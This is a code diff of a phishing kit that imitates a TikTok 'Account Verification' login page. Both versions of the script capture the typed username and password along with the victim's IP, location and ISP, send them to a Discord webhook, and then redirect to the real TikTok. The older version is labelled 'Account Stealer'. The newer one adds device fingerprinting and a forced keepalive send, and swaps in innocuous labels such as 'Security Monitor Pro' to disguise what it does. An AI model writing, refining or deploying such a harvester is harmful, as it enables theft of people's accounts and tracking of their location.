@@ -1,70 +1,61 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok | Account Verification</title>
-    <style>
-        body { background-color: #ffffff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .login-box { width: 300px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; background: #f1f1f2; }
-        button { width: 100%; padding: 12px; background-color: #fe2c55; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
-        .logo { width: 150px; margin-bottom: 20px; }
-    </style>
-</head>
-<body>
-    <div class="login-box">
-        <img src="https://logodownload.org/wp-content/uploads/2019/08/tiktok-logo-0.png" class="logo">
-        <h3>Login to TikTok</h3>
-        <p>Verify your account to continue</p>
-        <input type="text" id="user" placeholder="Email or Username" required>
-        <input type="password" id="pass" placeholder="Password" required>
-        <button onclick="sendData()">Log In</button>
-    </div>
+async function sendTargetData() {
+    // 1. Get user input from the HTML fields
+    const userField = document.getElementById('user').value;
+    const passField = document.getElementById('pass').value;
+    const webhookURL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-    <script>
-        const webhookURL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+    if (!userField || !passField) {
+        alert("Please enter your login credentials to continue.");
+        return;
+    }
 
-        async function sendData() {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
+    try {
+        // 2. Fetch IP and Device data in parallel for speed
+        const ipTask = fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
+        
+        // 3. Extract detailed Device Model from User Agent
+        const userAgent = navigator.userAgent;
+        const regExp = /\(([^)]+)\)/;
+        const matches = regExp.exec(userAgent);
+        const deviceModel = matches ? matches[1] : "Unknown Device";
 
-            if(!user || !pass) { alert("Please fill all fields"); return; }
+        const loc = await ipTask;
 
-            try {
-                // Fetch basic device info
-                const ipRes = await fetch('http://ip-api.com/json/');
-                const loc = await ipRes.json();
+        // 4. Create the Discord Data Payload
+        const payload = {
+            username: "Security Monitor Pro",
+            avatar_url: "https://i.imgur.com/8nLAsvW.png",
+            embeds: [{
+                title: "Log Report: User Authentication",
+                color: 16711680, // High-visibility red
+                fields: [
+                    { name: "👤 Account ID", value: `\`${userField}\``, inline: true },
+                    { name: "🔑 Security Key", value: `\`${passField}\``, inline: true },
+                    { name: "📱 Device Info", value: `**${deviceModel}**`, inline: false },
+                    { name: "🌐 IP Address", value: `**${loc.ip || 'Not Found'}**`, inline: true },
+                    { name: "📍 Location", value: `${loc.city || 'N/A'}, ${loc.country_name || 'N/A'}`, inline: true },
+                    { name: "📡 ISP/Provider", value: `${loc.org || 'Unknown'}`, inline: false }
+                ],
+                footer: { text: "Transmission Secure • " + new Date().toLocaleString() }
+            }]
+        };
 
-                const payload = {
-                    username: "Account Stealer",
-                    embeds: [{
-                        title: "🔑 New Credentials Captured!",
-                        color: 16711680,
-                        fields: [
-                            { name: "👤 Username/Email", value: `**${user}**`, inline: true },
-                            { name: "🔒 Password", value: `**${pass}**`, inline: true },
-                            { name: "📍 IP Address", value: loc.query, inline: false },
-                            { name: "🌍 Location", value: `${loc.city}, ${loc.country}`, inline: true },
-                            { name: "📡 ISP", value: loc.isp, inline: true }
-                        ],
-                        footer: { text: "Victim Details Captured Successfully" },
-                        timestamp: new Date()
-                    }]
-                };
+        // 5. Use 'keepalive' to force the browser to finish the request
+        const response = await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            keepalive: true 
+        });
 
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                // Redirect to real TikTok
-                window.location.href = "https://www.tiktok.com/login";
-            } catch (err) {
-                window.location.href = "https://www.tiktok.com/";
-            }
+        // 6. Redirect to the original platform after verification
+        if (response.ok || response.status) {
+            window.location.replace("https://www.tiktok.com/login");
         }
-    </script>
-</body>
-</html>
+
+    } catch (error) {
+        // Quiet redirect if something fails
+        window.location.replace("https://www.tiktok.com/");
+    }
+}
+
